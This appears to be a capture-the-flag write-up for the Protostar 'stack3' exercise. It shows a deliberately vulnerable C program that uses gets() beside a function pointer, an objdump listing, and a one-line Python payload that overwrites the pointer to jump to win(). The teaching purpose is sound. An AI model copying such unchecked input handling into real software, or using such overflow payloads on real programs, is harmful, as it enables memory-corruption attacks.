### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

### Solution 

In this challenge, we still have to change the value of a variable, although this time, it's not a simple integer, it's a function pointer.
The first step is to find the address of the function `win` (I chose `objdump` to do it).

```
08048424 <win>:
 8048424:      	55                     	push   %ebp
 8048425:      	89 e5                  	mov    %esp,%ebp
 8048427:      	83 ec 18               	sub    $0x18,%esp
 804842a:      	c7 04 24 40 85 04 08   	movl   $0x8048540,(%esp)
 8048431:      	e8 2a ff ff ff         	call   8048360 <puts@plt>
 8048436:      	c9                     	leave
 8048437:      	c3                     	ret
```

`0x08048424` is the address of the function `win`.
The remaining steps are the same as the previous exercises: we just need to change the value of `fp` to `0x08048424`.

```
user@protostar:/tmp$ python -c "print 'A'*64+'\x24\x84\x04\x08'" | stack3
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
